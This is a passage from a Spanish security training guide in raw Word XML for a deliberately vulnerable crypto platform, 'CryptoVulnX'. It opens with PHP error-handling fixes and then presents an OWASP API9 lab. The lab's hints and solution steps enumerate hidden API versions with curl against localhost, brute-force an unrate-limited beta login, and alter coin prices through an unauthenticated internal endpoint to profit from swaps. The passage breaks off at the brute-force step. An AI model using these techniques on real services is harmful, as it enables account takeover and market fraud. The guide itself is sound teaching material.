        <w:t>// helpers/error_handler.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>function handleDatabaseError(PDOException $e, string $context = ''): void {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Registrar error completo en logs internos (NUNCA al usuario)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    error_log(sprintf(</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "[DB_ERROR] Context: %s | Code: %s | Message: %s | File: %s:%d",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $context,</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $e-&gt;getCode(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $e-&gt;getMessage(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $e-&gt;getFile(),</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $e-&gt;getLine()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ));</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Respuesta generica al usuario</w:t>
        <w:br/>
        <w:t xml:space="preserve">    http_response_code(500);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "status" =&gt; "error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "message" =&gt; "Error interno del servidor. Contacte al administrador.",</w:t>
        <w:br/>
        <w:t xml:space="preserve">        "reference_id" =&gt; bin2hex(random_bytes(8)) // ID para correlacionar con logs</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    exit;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Uso en los endpoints:</w:t>
        <w:br/>
        <w:t>try {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt = $pdo-&gt;prepare("SELECT * FROM users WHERE email = ?");</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $stmt-&gt;execute([$email]);</w:t>
        <w:br/>
        <w:t>} catch (PDOException $e) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    handleDatabaseError($e, "user_login");</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>6. Desactivar Modo Debug en Produccion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// config/app.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>$app_env = getenv('APP_ENV') ?: 'production';</w:t>
        <w:br/>
        <w:br/>
        <w:t>// NUNCA habilitar debug en produccion</w:t>
        <w:br/>
        <w:t>define('APP_DEBUG', $app_env === 'development');</w:t>
        <w:br/>
        <w:br/>
        <w:t>if (!APP_DEBUG) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    // Desactivar reporte de errores al usuario</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ini_set('display_errors', '0');</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ini_set('display_startup_errors', '0');</w:t>
        <w:br/>
        <w:t xml:space="preserve">    error_reporting(0);</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    // Configurar manejador de errores personalizado</w:t>
        <w:br/>
        <w:t xml:space="preserve">    set_error_handler(function ($severity, $message, $file, $line) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        error_log("[$severity] $message in $file:$line");</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return true; // No propagar al usuario</w:t>
        <w:br/>
        <w:t xml:space="preserve">    });</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    set_exception_handler(function (Throwable $e) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        error_log("[EXCEPTION] " . $e-&gt;getMessage() . " in " . $e-&gt;getFile() . ":" . $e-&gt;getLine());</w:t>
        <w:br/>
        <w:t xml:space="preserve">        http_response_code(500);</w:t>
        <w:br/>
        <w:t xml:space="preserve">        echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "status" =&gt; "error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "message" =&gt; "Error interno del servidor"</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ]);</w:t>
        <w:br/>
        <w:t xml:space="preserve">    });</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 09 - Gestion de Inventario Inadecuada</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Referencia OWASP: API9:2023 - Improper Inventory Management</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Descubrir y explotar endpoints no documentados, versiones beta y servicios internos expuestos en la plataforma CryptoVulnX para:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Realizar fuerza bruta ilimitada contra una version beta del login sin rate limiting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Acceder a un servicio interno de cotizaciones que expone informacion de infraestructura.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Manipular precios de criptomonedas a traves de un endpoint interno expuesto publicamente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>La vulnerabilidad API9:2023 se produce cuando una organizacion no mantiene un inventario adecuado de sus APIs. Esto incluye versiones antiguas o beta que siguen accesibles, endpoints internos expuestos accidentalmente a internet, y documentacion desactualizada que no refleja todos los endpoints existentes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>En CryptoVulnX existen tres hallazgos criticos relacionados con esta vulnerabilidad:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Endpoint beta v2 de login</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Existe una version </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v2/auth/login.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> que fue desplegada como prueba y nunca fue descomisionada. Esta version no implementa rate limiting (lo confirma explicitamente en la respuesta con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rate_limit: none</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) y ademas expone la consulta SQL ejecutada en un campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:r>
        <w:t>, facilitando tanto la fuerza bruta como la inyeccion SQL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Servicio interno de cotizaciones (GET)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: El endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/internal/rates.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> fue disenado para comunicacion entre microservicios internos, pero quedo expuesto en el servidor web publico sin autenticacion. Las respuestas incluyen informacion de infraestructura como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>hostname</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>db_host</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Servicio interno de cotizaciones (POST)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: El mismo endpoint acepta solicitudes POST que permiten </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>actualizar los precios de las criptomonedas</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directamente en la base de datos, sin requerir autenticacion ni autorizacion alguna. Un atacante puede manipular los precios y luego ejecutar swaps a tasas favorables.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v2/auth/login.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Version beta del login (sin rate limit, con campo debug)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/internal/rates.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Servicio interno de cotizaciones (expone hostname, db_host)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/internal/rates.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Actualizacion de precios de criptomonedas (sin autenticacion)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Media</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Requiere habilidades de reconocimiento y enumeracion para descubrir los endpoints ocultos, y comprension de logica de negocio para explotarlos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Descubrimiento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">La API documentada usa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. ¿Has intentado cambiar la version en la URL? Prueba con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v2/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/internal/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Tambien puedes usar herramientas de fuzzing de directorios como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>gobuster</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ffuf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para descubrir rutas no documentadas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - Analisis del endpoint beta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v2/auth/login.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> devuelve mas informacion que la version v1. Observa los campos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rate_limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en la respuesta. El campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rate_limit: none</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> confirma que no hay limite de intentos. Puedes usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>hydra</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o un script de Bash para realizar fuerza bruta sin restricciones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Manipulacion de precios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">El endpoint </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/internal/rates.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> acepta tanto GET como POST. Con GET obtienes los precios actuales e informacion del servidor. Con POST puedes enviar un JSON con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{"rates":{"BTC":"&lt;nuevo_precio&gt;"}}</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para modificar el precio de BTC. Despues de modificar el precio, usa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/api/v1/crypto/swap.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para comprar a precio manipulado, restaura el precio original, y vende con ganancia.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 1: Fuerza Bruta via Endpoint Beta v2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Descubrir el endpoint beta mediante enumeracion de versiones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Probar diferentes versiones de la API</w:t>
        <w:br/>
        <w:t>for VERSION in v1 v2 v3 beta internal; do</w:t>
        <w:br/>
        <w:t xml:space="preserve">    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">      http://localhost/appsec/api/$VERSION/auth/login.php)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "api/$VERSION/auth/login.php -&gt; HTTP $STATUS"</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Resultado esperado:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>api/v1/auth/login.php -&gt; HTTP 200</w:t>
        <w:br/>
        <w:t>api/v2/auth/login.php -&gt; HTTP 200</w:t>
        <w:br/>
        <w:t>api/v3/auth/login.php -&gt; HTTP 404</w:t>
        <w:br/>
        <w:t>api/beta/auth/login.php -&gt; HTTP 404</w:t>
        <w:br/>
        <w:t>api/internal/auth/login.php -&gt; HTTP 404</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Comparar las respuestas entre v1 y v2.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Login v1 (con rate limiting)</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"admin@cryptovulnx.com","password":"wrongpass"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta v1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Credenciales invalidas",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "attempts_remaining": 4</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Login v2 (beta - sin rate limiting)</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/v2/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"admin@cryptovulnx.com","password":"wrongpass"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta v2 (mucho mas verbosa):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Credenciales invalidas",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "rate_limit": "none",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "debug": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "query": "SELECT * FROM users WHERE email = 'admin@cryptovulnx.com'",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "execution_time_ms": 2.4,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "rows_found": 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "api_version": "2.0-beta",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "timestamp": "2026-03-28T14:30:00Z"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Observar: el campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rate_limit: none</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> confirma la ausencia de limites y el campo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>debug</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> expone la consulta SQL.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Ejecutar fuerza bruta sin restricciones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
